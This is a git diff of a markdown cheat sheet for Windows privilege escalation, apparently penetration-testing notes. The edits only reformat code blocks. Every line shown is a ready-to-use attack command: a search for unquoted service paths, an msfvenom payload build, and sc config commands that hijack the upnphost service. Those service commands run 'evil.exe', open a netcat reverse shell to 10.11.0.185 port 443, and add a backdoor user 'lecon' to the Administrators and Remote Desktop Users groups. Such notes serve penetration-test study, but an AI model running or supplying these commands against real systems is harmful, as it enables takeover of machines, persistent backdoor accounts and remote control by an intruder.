@@ -614,8 +614,7 @@ net start upnphost
 #### Unquoted Service Paths - race condition
 
 ```
-wmic service get name,displayname,pathname,startmode |findstr /i "Auto" 
-|findstr /i /v "C:\Windows\\" |findstr /i /v """
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 icacls c:\program\SLMail\
 msfvenom -f exe -o pop3.exe
 ```
@@ -639,12 +638,16 @@ sc config upnphost obj= ".\LocalSystem" password= ""
 #### Binary Execution method
 ```sc config upnphost binpath= “C:\evil.exe”```
 #### Netcat method
-```sc config upnphost binpath= “\“C:\nc.exe\” \”-nv 10.11.0.185 443 -e C:\windows\system32\cmd.exe\””```
+```
+sc config upnphost binpath= “\“C:\nc.exe\” \”-nv 10.11.0.185 443 -e C:\windows\system32\cmd.exe\””
+```
 
 #### User Add method
-```sc config upnphost binpath= “net user lecon lecon /add”```
-```sc config upnphost binpath= “net localgroup Administrators lecon /add”```
-```sc config upnphost binpath= “net localgroup “/Remote Desktop Users/” lecon /add”```
+```
+sc config upnphost binpath= “net user lecon lecon /add”
+sc config upnphost binpath= “net localgroup Administrators lecon /add”
+sc config upnphost binpath= “net localgroup “/Remote Desktop Users/” lecon /add”
+```
 
 
 #### Always Install Elevated
